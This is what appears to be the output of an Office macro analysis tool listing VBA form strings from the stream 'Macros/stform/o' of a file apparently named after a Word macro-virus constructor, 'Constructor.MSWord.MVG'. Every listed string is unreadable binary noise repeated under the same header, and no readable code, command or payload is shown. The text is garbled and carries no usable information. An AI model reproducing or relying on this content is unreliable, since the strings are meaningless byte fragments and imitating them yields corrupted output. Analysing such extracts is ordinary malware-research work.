- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8Fj=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ߣ����Y�=-f�,�g�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xғ��ޑ���Z믁�^Mc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/n�|������~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�[=,��U׮�J%/?�����-t��z��٭oi�ge~w����nG�=_�Y��eε�5Vm]<~�byܙ|�Ӯߥ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m��W�ϓ?�<ۺ���:k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'K6?U���wm��'���N�Ǚtq�5��=o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��MJ��[Y�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~����}�v�s^�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
݋*�~�rn2S�?�2���|�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r:0���(���~�ҳ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�U��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�m<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����(����δ�W^��Q��ӗ���]���X�R4߷on�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�9���i����G�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J۵NN��I蔣^������&g^ņ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�Sk�۾���ǿ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɶ�	G���?W���k�_��t�O��7N�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�â�j��U- �M���P�5�e1[L�<�-)�����7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�K'�Vx�ϗx���P�U�6��ɯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b&v�͸��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
҈ҕ�l~�f�|�k���Ӝ!d5i��
Mj�e��՝a���Z_��iz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�o��/��Ug
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�e�;�Oʽ8��kO���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o1;���ץ\V���Z�5Ia԰��w:U�F��W�X�ݺ~^��Ĭa���������(��Uv��bn1��螚�W)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�!���[�Kz"�/��;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��騸E=WY%�Q���c��{z6Ev��EWrp�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=OQ{��H�~�"���nG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��|�w>r�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�PNZe�ǯ�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����D�Zg_̟?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�;~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɳ�u:��(�"�d��"��̒
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y+��=�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ǟ$��wY��VN1�Z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h��ik���b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�﷽�������v�ݵ��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��O��}=%���u�M�m�Li:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_����i�{�����~'��l���J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�Ū���6���&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ꖾe1X�Y��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kY�?wk�{�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|>������˪\���#ԡ�)F~w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e��y�I��}K[w�M��Ww�bg�]��I�]u�\e���AE˯�I6mX�p�r����iZc��:Emo�n�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���\��K�5�I=ޥp�=�zJ;�~魫:��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J��6����w���S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���z��z�y��S��z��%*�蔣�G���Gn�K�5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݾKm�6�-�W"�}��'|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wlT�����c�Si�ưpr�2k3�����|W�zS���Yr��>ks�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�^�u�I3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鄔��yu����v�u��˙YX�a:!-\>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ִ~���{?�$b��u��ܞN;a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e쌬|��5U$�;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k��K��ӕ�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�ܜyr`���a�z��}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǳ���I#Х�㟍+fQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M6�l)�.vX�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&,V�h�cu�ݭY��9�-��bY+)iY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>˒ܓ���r��XS�9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Uq��>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oO�u�寧��t�v%�~n=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d]L�M��M�K����3�8spsb�r^�Zd�[�x���˹S�T����Ej�^�6�Gl��qr��u��٫;�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cg�_�ӭO}e���
�L�7?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0��nKM&�/�z�E�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)jEmӶ�on��3����~MѦ�;-��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ՙ���88��x�#}�ꭙB���9�+��òP�R��]SꟉ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
対���soX�q^kn�<��s4(�p슜�#�]e'�]=�2�}֙����"m��b��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����~�֧������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g��棧�OF�V�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nf��N��߷OUs�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cg�_�u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:��Κi$�ӯ�'-c�C��9�&b��;'e�=g�v�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tKW�Q֯�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$S$�l��&��i�OE������1��Θ�1]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��֬ò.�l�i��k]:}B2�}�Y<��I��;���^�Ys�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cg�_�u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�u��sN�BóՌT�t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z鮨c�9�~�N��7���\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j{�ۼ��]n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IՇd�$�.�i(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����̑3\w��4�z��+on�t�;lò5�9NZx%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�[e�.n:ͭ��Z��S�s���Ӎkqڮ�|:�8��~�	�_|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�J_�oR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)������>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oO�u�﷟��t�tle8MJ-�qz�K�M{Q"���αݵ^�����Д%8���.2��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�&�h���o�|��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̈Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�r�1�ى�G�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��+6�я���hȣ��o�ԧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V���^����ZǺ���̵�Lw�~�t����*����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��~A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k>�����7�;ֵa�E�[*����=%	ti�&�:��a�;M/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wq���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�VI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�������#ҟ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6m:t��Zi]��k�����_��?���̿Y�Z�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9xyX�:rj�V���-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��o[D�·��˂�2Vif�|5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=��ݧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƺ5�_�����t��=7m��FP�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g"��N%��kXM.�{���Z�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s2�/Lw�-Ჷv�5L7ۇdbڎ�t�OE��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������[c�F�_�ݯ�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j{�ۼ��]n\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L��V؛�t�Q�_ͨ��Ӫ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y'2��N;{=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���̿X�S�M���
�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ՖY\0�s��b�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��CO$�Z֬c��~>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g�K_����:������;�WF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��q/�[j���rѽ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}z-Y�Hֳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������{��R���*Rv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ae`��֥��k��k���i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w&���q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
